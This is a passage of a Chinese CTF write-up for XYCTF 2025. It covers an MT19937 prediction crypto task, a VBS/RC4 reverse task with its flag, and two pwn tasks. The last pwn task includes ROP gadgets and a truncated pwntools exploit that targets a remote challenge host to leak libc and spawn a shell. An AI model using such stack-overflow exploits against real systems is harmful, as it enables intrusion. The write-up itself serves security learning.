class="number">208</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">209</span>, <span class="number">242</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">228</span>, <span class="number">14</span>, <span class="number">233</span>, <span class="number">8</span>, <span class="number">71</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">89</span>, <span class="number">46</span>, <span class="number">195</span>, <span class="number">101</span>, <span class="number">132</span>, <span class="number">254</span>, <span class="number">154</span>, <span class="number">183</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">221</span>, <span class="number">255</span>, <span class="number">174</span>, <span class="number">150</span>, <span class="number">65</span>, <span class="number">141</span>, <span class="number">176</span>, <span class="number">57</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">252</span>, <span class="number">144</span>, <span class="number">139</span>, <span class="number">52</span>, <span class="number">205</span>, <span class="number">224</span>, <span class="number">75</span>, <span class="number">190</span>, <span class="number">192</span>, <span class="number">2</span>, <span class="number">231</span>, <span class="number">30</span>, <span class="number">238</span>, <span class="number">149</span>, <span class="number">22</span>, <span class="number">200</span>, <span class="number">137</span>, <span class="number">244</span>, <span class="number">239</span>, <span class="number">185</span>, <span class="number">212</span>, <span class="number">145</span>, <span class="number">230</span>, <span class="number">200</span>, <span class="number">8</span>, <span class="number">249</span>, <span class="number">109</span>, <span class="number">26</span>, <span class="number">226</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">140</span>, <span class="number">103</span>, <span class="number">50</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>, <span class="number">196</span>, <span class="number">226</span>, <span class="number">105</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">135</span>, <span class="number">20</span>, <span class="number">214</span>, <span class="number">152</span>, <span class="number">211</span>, <span class="number">208</span>, <span class="number">81</span>, <span class="number">213</span>, <span class="number">48</span>, <span class="number">187</span>, <span class="number">232</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">16</span>, <span class="number">79</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">192</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">104</span>, <span class="number">85</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">94</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">247</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">219</span>, <span class="number">54</span>, <span class="number">247</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">60</span>, <span class="number">140</span>, <span class="number">10</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">148</span>, <span class="number">101</span>, <span class="number">198</span>, <span class="number">96</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">61</span>, <span class="number">25</span>, <span class="number">186</span>, <span class="number">29</span>, <span class="number">57</span>, <span class="number">176</span>, <span class="number">188</span>, <span class="number">9</span>, <span class="number">239</span>, <span class="number">93</span>, <span class="number">198</span>, <span class="number">110</span>, <span class="number">248</span>, <span class="number">23</span>, <span class="number">87</span>, <span class="number">193</span>, <span class="number">161</span>, <span class="number">107</span>, <span class="number">40</span>, <span class="number">38</span>, <span class="number">186</span>, <span class="number">205</span>, <span class="number">148</span>, <span class="number">197</span>, <span class="number">127</span>, <span class="number">144</span>, <span class="number">69</span>, <span class="number">19</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">82</span>, <span class="number">23</span>, <span class="number">170</span>, <span class="number">83</span>, <span class="number">224</span>, <span class="number">235</span>, <span class="number">49</span>, <span class="number">190</span>, <span class="number">44</span>, <span class="number">145</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">141</span>, <span class="number">78</span>, <span class="number">1</span>, <span class="number">254</span>, <span class="number">24</span>, <span class="number">157</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">227</span>, <span class="number">28</span>, <span class="number">81</span>, <span class="number">176</span>, <span class="number">22</span>, <span class="number">92</span>, <span class="number">139</span>, <span class="number">188</span>, <span class="number">48</span>, <span class="number">183</span>, <span class="number">229</span>, <span class="number">139</span>, <span class="number">205</span>, <span class="number">174</span>, <span class="number">131</span>, <span class="number">189</span>, <span class="number">241</span>, <span class="number">21</span>, <span class="number">146</span>, <span class="number">204</span>, <span class="number">58</span>, <span class="number">249</span>, <span class="number">167</span>, <span class="number">217</span>, <span class="number">174</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">56</span>, <span class="number">181</span>, <span class="number">212</span>, <span class="number">42</span>, <span class="number">188</span>, <span class="number">6</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">178</span>, <span class="number">160</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">150</span>, <span class="number">207</span>, <span class="number">245</span>, <span class="number">227</span>, <span class="number">247</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">114</span>, <span class="number">204</span>, <span class="number">101</span>, <span class="number">176</span>, <span class="number">55</span>, <span class="number">43</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">90</span>, <span class="number">124</span>, <span class="number">45</span>, <span class="number">96</span>, <span class="number">181</span>, <span class="number">221</span>, <span class="number">16</span>, <span class="number">121</span>, <span class="number">210</span>, <span class="number">51</span>, <span class="number">210</span>, <span class="number">164</span>, <span class="number">68</span>, <span class="number">64</span>, <span class="number">154</span>, <span class="number">167</span>, <span class="number">91</span>, <span class="number">69</span>, <span class="number">35</span>, <span class="number">153</span>, <span class="number">212</span>, <span class="number">10</span>, <span class="number">125</span>, <span class="number">235</span>, <span class="number">203</span>, <span class="number">166</span>, <span class="number">145</span>, <span class="number">9</span>, <span class="number">174</span>, <span class="number">86</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">112</span>, <span class="number">194</span>, <span class="number">140</span>, <span class="number">92</span>, <span class="number">170</span>, <span class="number">49</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">218</span>, <span class="number">199</span>, <span class="number">152</span>, <span class="number">151</span>, <span class="number">247</span>, <span class="number">208</span>, <span class="number">182</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">245</span>, <span class="number">5</span>, <span class="number">173</span>, <span class="number">105</span>, <span class="number">175</span>, <span class="number">159</span>, <span class="number">71</span>, <span class="number">251</span>, <span class="number">198</span>, <span class="number">246</span>, <span class="number">214</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">70</span>, <span class="number">154</span>, <span class="number">52</span>, <span class="number">39</span>, <span class="number">88</span>, <span class="number">149</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">86</span>, <span class="number">240</span>, <span class="number">108</span>, <span class="number">200</span>, <span class="number">83</span>, <span class="number">250</span>, <span class="number">62</span>, <span class="number">213</span>, <span class="number">113</span>, <span class="number">138</span>, <span class="number">73</span>, <span class="number">106</span>, <span class="number">141</span>, <span class="number">192</span>, <span class="number">204</span>, <span class="number">90</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">28</span>, <span class="number">124</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">119</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">204</span>, <span class="number">181</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">156</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">104</span>, <span class="number">186</span>, <span class="number">87</span>, <span class="number">221</span>, <span class="number">134</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">244</span>, <span class="number">203</span>, <span class="number">121</span>, <span class="number">181</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">185</span>, <span class="number">131</span>, <span class="number">230</span>, <span class="number">133</span>, <span class="number">54</span>, <span class="number">158</span>, <span class="number">186</span>, <span class="number">168</span>, <span class="number">201</span>, <span class="number">178</span>, <span class="number">155</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">111</span>, <span class="number">90</span>, <span class="number">209</span>, <span class="number">2</span>, <span class="number">167</span>, <span class="number">23</span>, <span class="number">176</span>, <span class="number">63</span>, <span class="number">139</span>, <span class="number">89</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">238</span>, <span class="number">110</span>, <span class="number">204</span>, <span class="number">85</span>, <span class="number">36</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">240</span>, <span class="number">177</span>, <span class="number">31</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">147</span>, <span class="number">205</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">173</span>, <span class="number">103</span>, <span class="number">130</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">232</span>, <span class="number">125</span>, <span class="number">216</span>, <span class="number">163</span>, <span class="number">209</span>, <span class="number">171</span>, <span class="number">168</span>, <span class="number">243</span>, <span class="number">145</span>, <span class="number">6</span>, <span class="number">170</span>, <span class="number">41</span>, <span class="number">142</span>, <span class="number">250</span>, <span class="number">145</span>, <span class="number">57</span>, <span class="number">139</span>, <span class="number">224</span>, <span class="number">221</span>, <span class="number">189</span>, <span class="number">48</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">92</span>, <span class="number">216</span>, <span class="number">154</span>, <span class="number">126</span>, <span class="number">223</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">82</span>, <span class="number">138</span>, <span class="number">221</span>, <span class="number">240</span>, <span class="number">223</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">165</span>, <span class="number">17</span>, <span class="number">52</span>, <span class="number">154</span>, <span class="number">91</span>, <span class="number">12</span>, <span class="number">121</span>, <span class="number">212</span>, <span class="number">238</span>, <span class="number">46</span>, <span class="number">215</span>, <span class="number">217</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">139</span>, <span class="number">251</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">188</span>, <span class="number">244</span>, <span class="number">251</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">22</span>, <span class="number">126</span>, <span class="number">200</span>, <span class="number">231</span>, <span class="number">153</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">219</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">203</span>, <span class="number">75</span>, <span class="number">163</span>, <span class="number">150</span>, <span class="number">194</span>, <span class="number">27</span>, <span class="number">208</span>, <span class="number">9</span>, <span class="number">186</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">46</span>, <span class="number">243</span>, <span class="number">135</span>, <span class="number">66</span>, <span class="number">40</span>, <span class="number">79</span>, <span class="number">206</span>, <span class="number">250</span>, <span class="number">20</span>, <span class="number">85</span>, <span class="number">123</span>, <span class="number">35</span>, <span class="number">164</span>, <span class="number">44</span>, <span class="number">85</span>, <span class="number">104</span>, <span class="number">66</span>, <span class="number">51</span>, <span class="number">177</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">165</span>, <span class="number">226</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">78</span>, <span class="number">225</span>, <span class="number">252</span>, <span class="number">226</span>, <span class="number">138</span>, <span class="number">81</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">175</span>, <span class="number">122</span>, <span class="number">145</span>, <span class="number">68</span>, <span class="number">254</span>, <span class="number">37</span>, <span class="number">153</span>, <span class="number">39</span>, <span class="number">113</span>, <span class="number">237</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">181</span>, <span class="number">21</span>, <span class="number">197</span>, <span class="number">186</span>, <span class="number">56</span>, <span class="number">202</span>, <span class="number">239</span>, <span class="number">213</span>, <span class="number">135</span>, <span class="number">41</span>, <span class="number">6</span>, <span class="number">85</span>, <span class="number">54</span>, <span class="number">135</span>, <span class="number">214</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">153</span>, <span class="number">235</span>, <span class="number">110</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">220</span>, <span class="number">142</span>, <span class="number">236</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">117</span>, <span class="number">205</span>, <span class="number">249</span>, <span class="number">92</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">235</span>, <span class="number">205</span>, <span class="number">232</span>, <span class="number">21</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">124</span>, <span class="number">218</span>, <span class="number">166</span>, <span class="number">155</span>, <span class="number">183</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">193</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">22</span>, <span class="number">197</span>, <span class="number">75</span>, <span class="number">10</span>, <span class="number">165</span>, <span class="number">44</span>, <span class="number">215</span>, <span class="number">210</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">235</span>, <span class="number">200</span>, <span class="number">247</span>, <span class="number">158</span>, <span class="number">187</span>, <span class="number">200</span>, <span class="number">102</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">73</span>, <span class="number">42</span>, <span class="number">131</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">180</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">228</span>, <span class="number">226</span>, <span class="number">219</span>, <span class="number">175</span>, <span class="number">207</span>, <span class="number">81</span>, <span class="number">53</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">140</span>, <span class="number">59</span>, <span class="number">218</span>, <span class="number">169</span>, <span class="number">7</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">75</span>, <span class="number">210</span>, <span class="number">97</span>, <span class="number">236</span>, <span class="number">157</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">195</span>, <span class="number">128</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">55</span>, <span class="number">217</span>, <span class="number">127</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">86</span>, <span class="number">255</span>, <span class="number">22</span>, <span class="number">186</span>, <span class="number">94</span>, <span class="number">151</span>, <span class="number">114</span>, <span class="number">93</span>, <span class="number">19</span>, <span class="number">198</span>, <span class="number">159</span>, <span class="number">174</span>, <span class="number">142</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">157</span>, <span class="number">206</span>, <span class="number">161</span>, <span class="number">107</span>, <span class="number">255</span>, <span class="number">106</span>, <span class="number">196</span>, <span class="number">250</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">221</span>, <span class="number">196</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">50</span>, <span class="number">224</span>, <span class="number">42</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">191</span>, <span class="number">157</span>, <span class="number">237</span>, <span class="number">10</span>, <span class="number">157</span>, <span class="number">80</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">180</span>, <span class="number">1</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">239</span>, <span class="number">129</span>, <span class="number">14</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">66</span>, <span class="number">203</span>, <span class="number">120</span>, <span class="number">114</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">153</span>, <span class="number">182</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">177</span>, <span class="number">75</span>, <span class="number">220</span>, <span class="number">210</span>, <span class="number">105</span>, <span class="number">154</span>, <span class="number">149</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">202</span>, <span class="number">128</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">96</span>, <span class="number">158</span>, <span class="number">150</span>, <span class="number">57</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">127</span>, <span class="number">160</span>, <span class="number">57</span>, <span class="number">80</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">241</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">14</span>, <span class="number">110</span>, <span class="number">160</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">156</span>, <span class="number">185</span>, <span class="number">158</span>, <span class="number">221</span>, <span class="number">110</span>, <span class="number">76</span>, <span class="number">255</span>, <span class="number">119</span>, <span class="number">15</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">238</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">250</span>, <span class="number">220</span>, <span class="number">147</span>, <span class="number">193</span>, <span class="number">51</span>, <span class="number">144</span>, <span class="number">123</span>, <span class="number">139</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">148</span>, <span class="number">251</span>, <span class="number">82</span>, <span class="number">227</span>, <span class="number">119</span>, <span class="number">92</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">239</span>, <span class="number">217</span>, <span class="number">101</span>, <span class="number">88</span>, <span class="number">121</span>, <span class="number">10</span>, <span class="number">148</span>, <span class="number">203</span>, <span class="number">156</span>, <span class="number">156</span>]</span><br></pre></td></tr></table></figure><ul><li>这题的思路就还是一个伪随机数预测，而这题的伪随机数预测并不是正向预测，而是反向预测。而<code>Division</code>这题是<code>624</code>个<code>32位int类型</code>，其实也就是<code>2496</code>字节。</li><li>而我们<code>choice</code>也是<code>2496</code>字节，这时我们也满足预测的条件。我们还可以使用<code>RandCrack</code>这个库进行如下反推。</li><li><code>exp</code>如下图所示：</li></ul><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="warmup"><a class="markdownIt-Anchor" href="#warmup"></a> WARMUP</h2><ul><li>拿到附件后看到是<code>.vbs</code>后缀的文件，运行一下就会出现这样的弹窗</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405182812516.png" alt="image-20250405182812516"></p><ul><li>上网搜索了一下关于<code>vbs</code>的逆向发现这篇文章，直接抓住关键点</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405182907044.png" alt="image-20250405182907044"></p><ul><li>修改一下，再运行该程序</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405182941205.png" alt="image-20250405182941205"></p><ul><li>发现实现的是一个<code>RC4</code>加密，密文为图中一长串的字符，密钥为<code>rc4key</code></li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405183001071.png" alt="image-20250405183001071"></p><ul><li>提取密文和密钥后在线<code>rc4</code>解密，解密后就可以得到<code>flag</code></li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405183407820.png" alt="image-20250405183407820"></p><ul><li>flag如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn<span class="string">&#x27;s_chall_is_r3@lly_gr3@t_&amp;_fuN!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="明日方舟模拟器复现"><a class="markdownIt-Anchor" href="#明日方舟模拟器复现"></a> 明日方舟模拟器(复现)</h2><ul><li>复现一下这题，其实看完这个代码后，发现这题其实算是最简单的一题。稍微代码审计一下就能看到漏洞点其实是一个栈溢出操作，并且其实还给了<code>system()</code>函数。大大降低了难度。</li><li>可惜当时比赛的时候没有认真把<code>PWN</code>牢下去，感觉对<code>PWN</code>没有大一那时候那么热爱了<code>QAQ</code>。希望能恢复大一的状态。</li><li>接下来还是老样子，查看一下保护机制。发现<code>canary</code>和<code>PIE</code>都没有开启。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415162913436.png" alt="image-20250415162913436"></p><ul><li>接下来逆向一下这个程序，逆向之后发现<code>csu</code>这个<code>gadget</code>还在。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415163041596.png" alt="image-20250415163041596"></p><ul><li>现在边运行程序，边对程序进行逆向分析，在分析的过程中，我们会发现程序运行的主要逻辑就是在<code>main</code>函数中。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415163921186.png" alt="image-20250415163921186"></p><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415163909404.png" alt="image-20250415163909404"></p><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415163935302.png" alt="image-20250415163935302"></p><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415163951919.png" alt="image-20250415163951919"></p><ul><li>通过分析代码运行逻辑，最终发现栈溢出的点在这个位置</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415164030808.png" alt="image-20250415164030808"></p><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415164044420.png" alt="image-20250415164044420"></p><ul><li><p>所以在进行栈溢出漏洞利用的时候，我们需要触发<code>[1]向好友炫耀</code></p></li><li><p>接下来我们再分析一下其他函数，通过运行程序我们会发现<code>employ()</code>这个函数主要就是一个抽卡的功能。</p></li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415164543604.png" alt="image-20250415164543604"></p><ul><li>通过分析程序，我们会发现<code>star()</code>这个函数，是在抽卡中随机生成<code>星星的数量</code>，对漏洞的利用貌似并无什么作用，但是看了<code>WP</code>后才发现<code>sum_count</code>这个位于<code>bss</code>段的变量非常关键。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415164746691.png" alt="image-20250415164746691"></p><ul><li>接下来我们寻找一下字符串，发现并没有<code>/bin/sh</code>这个字符串，这时我们就需要写入字符串。所以这题思路就是利用栈迁移，</li></ul><h2 id="ret2libcs-revenge"><a class="markdownIt-Anchor" href="#ret2libcs-revenge"></a> Ret2libc’s Revenge</h2><ul><li>这题打的是比较高版本的libc，所以我们使用<code>IDA</code>反编译后该文件，就会发现这个程序并没有<code>csu</code>这个函数，所以我们就没办法使用<code>csu</code>中的<code>gadget</code>。这时我们就要去寻找其他的<code>gadget</code>。</li><li>我们先查看一下保护机制。<code>PIE</code>和<code>Canary</code>都没有开启。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405175006454.png" alt="image-20250405175006454"></p><ul><li>这时我们再反编译一下这个程序，查看一下这个程序的运行逻辑。<code>main</code>函数还是比较简单的</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405175117749.png" alt="image-20250405175117749"></p><ul><li>查看<code>init</code>函数，我们发现程序的标准输出和标准错误输出被设置了全缓冲，也就是在调用后俩个<code>setvbuf</code>时，程序会一共申请了两个size位为<code>0x410</code>大小的堆块，当做我们标准输出和标准错误的缓冲区</li><li>当我们的缓冲区满被要输出的字符串填满后，程序才会将要输出的内容输出给用户，或者程序运行结束之前，会将缓冲区的内容输出给程序。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405175146646.png" alt="image-20250405175146646"></p><ul><li>查看<code>revenge</code>，这里有俩个陌生的函数，<code>feof(stdin)</code>、<code>fgetc(stdin)</code>,我们使用<code>man</code>命令查看一下它们的功能，<code>feof(stdin)</code>功能就是检查我们的<code>stdin</code>流输入的数据是否为<code>EOF</code>文件结束符，如果是文件结束符就表明结束输入，就返回<code>非零</code>。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405180015569.png" alt="image-20250405180015569"></p><ul><li><code>fgetc(stdin)</code>函数如下描述如下：就是读入输入流的下一个字符串，并将该字符串转换由原来的<code>unsigned char</code>类型转换为<code>int</code>类型。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405180334524.png" alt="image-20250405180334524"></p><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405175629483.png" alt="image-20250405175629483"></p><ul><li>知道这个函数的大概逻辑了，这个函数就是将用户输入的内容逐个字节存储到<code>v2</code>这个数组中，并且没有限制长度。这时我们就可以进行无限长度的栈溢出</li><li>但是在溢出的时候我们要注意一下<code>v6</code>这个变量，这个变量是控制我们将数据写入到栈中的具体位置，如果我们溢出的时候对这个以不合适的数据对这个进行栈溢出，就会出现一些问题，覆盖完<code>v6</code>这个变量后就重头开始溢出了，或者跳过返回地址继续溢出下去。</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405181322324.png" alt="image-20250405181322324"></p><ul><li>溢出之后我们就要寻找<code>gadgat</code>了，我选取的是这几个<code>gadget</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4010ea  nop ; add rsi, qword ptr [rbp + 0x20] ; ret</span><br><span class="line">0x4010e0  xor rdi, rdi ; nop ; and rsi, 0 ; ret</span><br></pre></td></tr></table></figure><ul><li><p>我们再溢出的时候修改<code>var_4</code>这个变量，使其跳过<code>rbp</code>指针指向的位置（我们接下去写入的时候，修改的就直接是返回地址。）</p></li><li><p>之后我们向<code>[rbp + 0x20]</code>这个位置写入<code>puts_got</code>表的地址这样我们就达到了<code>pop rdi</code>的效果。</p></li><li><p>之后就是多次调用<code>puts</code>函数输出<code>Ret2libc's Revenge</code>，将缓冲区输出出来，这时我们的<code>puts_addr</code>也会被输出出来。我们就得到了<code>libc</code>的地址。之后就是构造<code>system(&quot;/bin/sh&quot;)</code>了</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./attachment&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;47.93.96.189&#x27;</span>,<span class="number">22581</span>)</span><br><span class="line">main_addr = <span class="number">0x40127B</span></span><br><span class="line"><span class="comment"># 0x4010ea  nop ; add rsi, qword ptr [rbp + 0x20] ; ret</span></span><br><span class="line">add_rsi_rbp = <span class="number">0x4010ea</span></span><br><span class="line">mov_rdi_rsi = <span class="number">0x401180</span></span><br><span class="line">mov_rsi_0   = <span class="number">0x4010e0</span></span><br><span class="line">call_puts   = <span class="number">0x401294</span></span><br><span class="line">puts_got = <span class="number">0x404018</span></span><br><span class="line">puts_plt = <span class="number">0x401074</span></span><br><span class="line"><span class="comment"># 0x4010e0   xor rdi, rdi ; nop ; and rsi, 0 ; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x220</span>-<span class="number">0x4</span>) +<span class="string">b&#x27;\x28&#x27;</span> + p64(mov_rsi_0) + p64(add_rsi_rbp)</span><br><span class="line">payload += p64(mov_rdi_rsi)+p64(puts_plt) + p64(main_addr) + 